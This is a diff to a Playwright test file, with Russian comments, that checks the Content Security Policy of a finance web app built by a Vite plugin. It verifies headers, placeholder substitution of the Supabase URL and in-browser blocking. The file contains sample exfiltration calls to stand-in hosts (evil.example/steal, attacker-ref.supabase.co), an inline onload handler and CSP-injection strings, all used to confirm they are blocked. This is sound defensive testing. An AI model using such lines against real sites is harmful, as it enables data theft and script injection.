@@ -2,11 +2,14 @@ import { readFileSync } from 'node:fs';
 import { join } from 'node:path';
 import type { Page } from '@playwright/test';
 import { addTx, createWallet, dismissToasts, expect, goSection, sheet, test, waitReady } from '../helpers';
-import { DIST, ROOT, headersFor, parseCsp, readVercel, recordViolations, startHeaderServer, type HeaderServer } from './helpers';
+import { applyCsp, supabaseConnectSources } from '../../vite.config';
+import { DIST, ROOT, buildVariant, headersFor, parseCsp, readVercel, recordViolations, startHeaderServer, type HeaderServer } from './helpers';
 
 /* ---------------------------------------------------------------------------------------------
- * Политика безопасности страницы (CSP): приложение работает под НАСТОЯЩИМИ заголовками из vercel.json и мета-тегом
- * из index.html без единого нарушения; сама политика действительно что-то запрещает (контроль «не пустышка»).
+ * Политика безопасности страницы (CSP): полную политику даёт мета-тег index.html, собранный под конкретный проект
+ * (плагин finoraCsp в vite.config.ts); заголовок из vercel.json добавляет к ней только frame-ancestors 'none'.
+ * Приложение работает под НАСТОЯЩИМИ заголовками и мета-тегом без единого нарушения; политика действительно что-то
+ * запрещает (контроль «не пустышка»). Облачная сборка и чужие проекты Supabase: e2e/sec/cloud.spec.ts.
  * ------------------------------------------------------------------------------------------- */
 
 let srv: HeaderServer;
@@ -17,12 +20,13 @@ test.afterAll(async () => {
   await srv.close();
 });
 
-const headerCsp = (): string => headersFor('/')['content-security-policy'] ?? '';
-const metaCsp = (): string => {
-  const html = readFileSync(join(ROOT, 'index.html'), 'utf8');
-  const m = html.match(/http-equiv="Content-Security-Policy"\s+content="([^"]*)"/);
-  return m?.[1] ?? '';
-};
+const CSP_META_RE = /http-equiv="Content-Security-Policy"\s+content="([^"]*)"/;
+const metaOf = (html: string): string => html.match(CSP_META_RE)?.[1] ?? '';
+/** Мета-политика СОБРАННОГО (локальная сборка, без облака) index.html: то, что видит браузер. */
+const builtMeta = (): string => metaOf(readFileSync(join(DIST, 'index.html'), 'utf8'));
+const templateHtml = (): string => readFileSync(join(ROOT, 'index.html'), 'utf8');
+
+const RATE_HOSTS = ['https://www.nbt.tj', 'https://cdn.jsdelivr.net', 'https://latest.currency-api.pages.dev'];
 
 test.describe('Статика: vercel.json и index.html', () => {
   test('заголовки безопасности заданы для всех путей', () => {
@@ -31,6 +35,7 @@ test.describe('Статика: vercel.json и index.html', () => {
     expect(h['referrer-policy']).toMatch(/^(no-referrer|strict-origin-when-cross-origin)$/);
     expect(h['x-frame-options']).toBe('DENY');
     expect(h['strict-transport-security']).toMatch(/max-age=\d{7,}/);
+    expect(h['cross-origin-opener-policy']).toBe('same-origin');
     const pp = h['permissions-policy'] ?? '';
     for (const f of ['camera', 'microphone', 'geolocation']) expect(pp, f).toContain(`${f}=()`);
     expect(parseCsp(h['content-security-policy'] ?? '')['frame-ancestors']).toEqual(["'none'"]);
@@ -43,8 +48,16 @@ test.describe('Статика: vercel.json и index.html', () => {
     expect(headersFor('/manifest.webmanifest')['cache-control']).not.toMatch(/immutable/);
   });
 
-  test('CSP: без unsafe-eval и без unsafe-inline в скриптах; опасные директивы закрыты', () => {
-    const csp = parseCsp(headerCsp());
+  test('заголовок CSP из vercel.json — ТОЛЬКО frame-ancestors (полная политика приходит из мета-тега, собранного под проект)', () => {
+    for (const p of ['/', '/sw.js', '/assets/x.js']) {
+      expect(parseCsp(headersFor(p)['content-security-policy'] ?? ''), p).toEqual({ 'frame-ancestors': ["'none'"] });
+    }
+    // заголовок не должен тянуть за собой подстановку *.supabase.co: ни в одном заголовке
+    expect(JSON.stringify(readVercel())).not.toMatch(/supabase|\*\./);
+  });
+
+  test('сборка без облака: полная политика — в мета-теге; без unsafe-eval и без unsafe-inline; опасные директивы закрыты', () => {
+    const csp = parseCsp(builtMeta());
     expect(csp['default-src']).toEqual(["'self'"]);
     expect(csp['script-src']).toEqual(["'self'"]);
     expect(csp['object-src']).toEqual(["'none'"]);
@@ -52,18 +65,19 @@ test.describe('Статика: vercel.json и index.html', () => {
     expect(csp['form-action']).toEqual(["'self'"]);
     expect(csp['worker-src']).toEqual(["'self'"]);
     expect(csp['manifest-src']).toEqual(["'self'"]);
-    expect(headerCsp()).not.toMatch(/unsafe-eval|\*(?![.])| data:[^;]*script/);
+    expect(csp['media-src']).toEqual(["'none'"]);
+    expect(builtMeta()).not.toMatch(/unsafe-eval|\*(?![.])| data:[^;]*script/);
+    // в сборке стиль строгий: 'unsafe-inline' нет нигде (он нужен только `npm run dev`, и его подставляет плагин лишь там).
+    // React ставит style через CSSOM, это политика не блокирует (проверено на всех экранах ниже).
     expect(csp['style-src']).toEqual(["'self'"]);
-    // 'unsafe-inline' нет нигде: React ставит style через CSSOM, это политика не блокирует (проверено на всех экранах ниже)
-    const withUnsafe = Object.entries(csp).filter(([, v]) => v.includes("'unsafe-inline'")).map(([k]) => k);
-    expect(withUnsafe).toEqual([]);
+    expect(Object.entries(csp).filter(([, v]) => v.includes("'unsafe-inline'"))).toEqual([]);
+    // frame-ancestors в мета-теге не работает (браузер его игнорирует и ругается в консоли), поэтому он только в заголовке
+    expect(csp['frame-ancestors']).toBeUndefined();
   });
 
-  test('CSP: connect-src — только свои, Supabase и источники курсов из src/rates', () => {
-    const connect = parseCsp(headerCsp())['connect-src'] ?? [];
-    expect(connect).toEqual(
-      expect.arrayContaining(["'self'", 'https://*.supabase.co', 'wss://*.supabase.co', 'https://www.nbt.tj', 'https://cdn.jsdelivr.net', 'https://latest.currency-api.pages.dev']),
-    );
+  test('сборка без облака: connect-src — только свои и источники курсов из src/rates, ни одного адреса Supabase, ни одной звёздочки', () => {
+    const connect = parseCsp(builtMeta())['connect-src'] ?? [];
+    expect(connect).toEqual(["'self'", ...RATE_HOSTS]);
     // каждый внешний адрес в исходниках курсов разрешён
     const api = readFileSync(join(ROOT, 'src/rates/api.ts'), 'utf8');
     const nbt = readFileSync(join(ROOT, 'src/rates/nbt.ts'), 'utf8');
@@ -71,17 +85,16 @@ test.describe('Статика: vercel.json и index.html', () => {
     for (const h of new Set(hosts)) expect(connect, `источник курсов ${h}`).toContain(h);
   });
 
-  test('мета-CSP в index.html совпадает с заголовком, кроме frame-ancestors (в мета не работает) и style-src (нужен dev-серверу)', () => {
-    const meta = parseCsp(metaCsp());
-    const head = parseCsp(headerCsp());
-    expect(meta['frame-ancestors']).toBeUndefined();
-    delete head['frame-ancestors'];
-    // dev-сервер Vite вставляет CSS через <style>: в мета разрешён inline-стиль, а боевой заголовок строгий (побеждает строгий)
-    expect(meta['style-src']).toEqual(["'self'", "'unsafe-inline'"]);
-    expect(head['style-src']).toEqual(["'self'"]);
-    delete meta['style-src'];
-    delete head['style-src'];
-    expect(meta).toEqual(head);
+  test('шаблон index.html: две метки внутри мета-политики, никаких *.supabase.co, в собранном файле меток не осталось', () => {
+    const tpl = metaOf(templateHtml());
+    expect(tpl).toContain('@@SUPABASE_CONNECT@@');
+    expect(tpl).toContain('@@DEV_STYLE@@');
+    expect(tpl).not.toMatch(/supabase\.co|\*/);
+    const built = readFileSync(join(DIST, 'index.html'), 'utf8');
+    expect(metaOf(built)).not.toContain('@@');
+    expect(built.match(/Content-Security-Policy/g)?.length, 'в сборке ровно одна мета-политика (плюс упоминание в комментарии)').toBeGreaterThanOrEqual(1);
+    // шаблон без меток вне мета-тега не трогаем: комментарий index.html собран как был
+    expect(built).toContain('метка SUPABASE_CONNECT');
   });
 
   test('в собранном index.html нет встроенных скриптов и обработчиков on*=', () => {
@@ -90,6 +103,95 @@ test.describe('Статика: vercel.json и index.html', () => {
     expect(inline.map((m) => m[0].slice(0, 80))).toEqual([]);
     expect(html).not.toMatch(/\son[a-z]+\s*=/i);
     expect(html).toMatch(/Content-Security-Policy/); // мета дошло до сборки
+  });
+});
+
+/* ------------------- плагин finoraCsp: подстановка адреса Supabase ------------------- */
+
+test.describe('Плагин CSP (vite.config.ts): что попадает в connect-src', () => {
+  const KEY = 'sb_publishable_FAKEKEYFORTESTING0123456789';
+  const env = (url: unknown, key: unknown = KEY) => ({ VITE_SUPABASE_URL: url, VITE_SUPABASE_ANON_KEY: key });
+  const html = () => templateHtml();
+  const connectOf = (h: string) => parseCsp(metaOf(h))['connect-src'] ?? [];
+  test.beforeEach(({ browserName: _b }, info) => test.skip(info.project.name !== 'desktop', 'чистая функция, не зависит от устройства'));
+
+  test('облака нет: переменных нет, пустые, заготовки из .env.example, нет ключа или нет адреса — адресов Supabase в политике нет вовсе', () => {
+    const none: Array<[string, Record<string, unknown>]> = [
+      ['нет переменных', {}],
+      ['пустые строки', env('', '')],
+      ['заготовка адреса и ключа (.env.example)', env('https://YOUR-PROJECT-REF.supabase.co', 'sb_publishable_xxx')],
+      ['заготовка адреса при настоящем ключе', env('https://YOUR-PROJECT-REF.supabase.co')],
+      ['настоящий адрес, но ключ — заготовка', env('https://abcdefgh.supabase.co', 'sb_publishable_xxx')],
+      ['адрес без ключа', env('https://abcdefgh.supabase.co', '')],
+      ['ключ без адреса', env('', KEY)],
+      ['не адрес', env('не адрес')],
+      ['ftp вместо https', env('ftp://abcdefgh.supabase.co')],
+      ['javascript:', env('javascript:alert(1)')],
+    ];
+    for (const [title, e] of none) {
+      expect(supabaseConnectSources(e), title).toEqual([]);
+      expect(connectOf(applyCsp(html(), e, false)), title).toEqual(["'self'", ...RATE_HOSTS]);
+    }
+  });
+
+  test('облако есть: точный источник https + wss, без звёздочек; путь, слеши, регистр и порт по умолчанию отбрасываются', () => {
+    const exact = ['https://example-ref.supabase.co', 'wss://example-ref.supabase.co'];
+    for (const url of ['https://example-ref.supabase.co', 'https://example-ref.supabase.co/', 'https://EXAMPLE-ref.Supabase.co//', ' https://example-ref.supabase.co/rest/v1 ', 'https://example-ref.supabase.co:443', 'https://user:pw@example-ref.supabase.co']) {
+      expect(supabaseConnectSources(env(url)), url).toEqual(exact);
+    }
+    expect(connectOf(applyCsp(html(), env('https://example-ref.supabase.co'), false))).toEqual(["'self'", ...exact, ...RATE_HOSTS]);
+    // свой домен, порт, поддомены — ровно тот хост, который указан
+    expect(supabaseConnectSources(env('https://db.moya-firma.tj:8443/'))).toEqual(['https://db.moya-firma.tj:8443', 'wss://db.moya-firma.tj:8443']);
+    expect(supabaseConnectSources(env('https://münchen.example'))).toEqual(['https://xn--mnchen-3ya.example', 'wss://xn--mnchen-3ya.example']);
+    // http (локальный Supabase для разработки): http + ws, и только этот адрес
+    expect(supabaseConnectSources(env('http://127.0.0.1:54321'))).toEqual(['http://127.0.0.1:54321', 'ws://127.0.0.1:54321']);
+    expect(supabaseConnectSources(env('https://example-ref.supabase.co')).join(' ')).not.toContain('*');
+  });
+
+  test('адрес, из которого в политику можно дописать чужое, отвергается громкой ошибкой сборки (а не молча)', () => {
+    for (const url of [
+      "https://a.example;script-src*", // «;» открывает новую директиву
+      "https://a'b.example", // кавычка
+      'https://a*.example', // звёздочка
+      'https://a,b.example',
+      'https://[::1]:8000', // IPv6 в политику не вписываем
+      'https://a.example./', // хост с точкой на конце
+      'https://a_b.example',
+    ]) {
+      expect(() => supabaseConnectSources(env(url)), url).toThrow(/нельзя вписать в политику/);
+    }
+  });
+
+  test("метки: 'unsafe-inline' для стилей только в dev; без меток или без мета-тега — ошибка, комментарий не портится", () => {
+    const e = env('https://example-ref.supabase.co');
+    expect(parseCsp(metaOf(applyCsp(html(), e, false)))['style-src']).toEqual(["'self'"]);
+    expect(parseCsp(metaOf(applyCsp(html(), e, true)))['style-src']).toEqual(["'self'", "'unsafe-inline'"]);
+    // dev не меняет ничего, кроме style-src
+    const dev = parseCsp(metaOf(applyCsp(html(), e, true)));
+    const prod = parseCsp(metaOf(applyCsp(html(), e, false)));
+    delete dev['style-src'];
+    delete prod['style-src'];
+    expect(dev).toEqual(prod);
+    // комментарий в начале файла остаётся как был, метки заменены только в content
+    const out = applyCsp(html(), e, false);
+    expect(out.slice(0, out.indexOf('<meta\n      http-equiv'))).toBe(html().slice(0, html().indexOf('<meta\n      http-equiv')));
+    expect(() => applyCsp(html().replace('@@SUPABASE_CONNECT@@', ''), e, false)).toThrow(/нет метки/);
+    expect(() => applyCsp(html().replace('@@DEV_STYLE@@', ''), e, false)).toThrow(/нет метки/);
+    expect(() => applyCsp('<html></html>', e, false)).toThrow(/нет мета-тега/);
+    // метка только в комментарии (а в мета-теге её нет) не считается
+    const only = html().replace("connect-src 'self'@@SUPABASE_CONNECT@@", "connect-src 'self'");
+    expect(() => applyCsp(only, e, false)).toThrow(/нет метки/);
+  });
+
+  test('сборка с неподходящим адресом падает с понятной ошибкой, а не выкладывает приложение с неполной политикой', () => {
+    let out = '';
+    try {
+      buildVariant('bad-url', { VITE_SUPABASE_URL: 'https://a.example;script-src*', VITE_SUPABASE_ANON_KEY: KEY });
+    } catch (e) {
+      const err = e as { stderr?: Buffer; stdout?: Buffer; message: string };
+      out = `${err.stderr?.toString() ?? ''}${err.stdout?.toString() ?? ''}${err.message}`;
+    }
+    expect(out, 'сборка должна упасть').toContain('нельзя вписать в политику');
   });
 });
 
@@ -171,7 +273,7 @@ test.describe('CSP в настоящем браузере', () => {
     expect(await violations(), 'нарушения CSP').toEqual([]);
     // запросы курсов дошли только до хостов из белого списка
     const hosts = new Set(external.map((u) => new URL(u).origin));
-    for (const h of hosts) expect(['https://www.nbt.tj', 'https://cdn.jsdelivr.net', 'https://latest.currency-api.pages.dev', 'https://abcdefgh.supabase.co']).toContain(h);
+    for (const h of hosts) expect(RATE_HOSTS).toContain(h);
     expect(REFERERS, 'адрес приложения уходит во внешние запросы курсов (Referer)').toEqual([]);
     // браузер не жалуется на неизвестные признаки Permissions-Policy и т. п.
     expect(warnings.filter((w) => /Permissions-Policy|Feature-Policy|Content Security|X-Frame/i.test(w))).toEqual([]);
@@ -199,6 +301,8 @@ test.describe('CSP в настоящем браузере', () => {
       const st = document.createElement('style'); st.textContent = 'body{outline:9px solid red !important}'; document.head.appendChild(st);
       out.styleApplied = String(getComputedStyle(document.body).outlineWidth === '9px');
       try { await fetch('https://evil.example/steal?x=1'); out.fetch = 'sent'; } catch (e) { out.fetch = 'blocked:' + e.name; }
+      // в локальной сборке облака нет: даже ЧУЖОЙ проект Supabase недоступен (раньше его пропускала подстановка *.supabase.co)
+      try { await fetch('https://attacker-ref.supabase.co/rest/v1/steal'); out.fetchSupabase = 'sent'; } catch (e) { out.fetchSupabase = 'blocked:' + e.name; }
       const img = new Image(); img.src = 'https://evil.example/pixel.gif';
       const d = document.createElement('div');
       d.innerHTML = '<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" onload="window.__ran=true">';
@@ -222,6 +326,7 @@ test.describe('CSP в настоящем браузере', () => {
     expect(result.timer).toBe('false'); // setTimeout со строкой — тот же eval
     expect(result.styleApplied).toBe('false');
     expect(result.fetch).toMatch(/^blocked/);
+    expect(result.fetchSupabase).toMatch(/^blocked/);
     expect(result.inlineHandler).toBe('false');
     const v = await violations();
     const dirs = new Set(v.map((x) => x.directive));
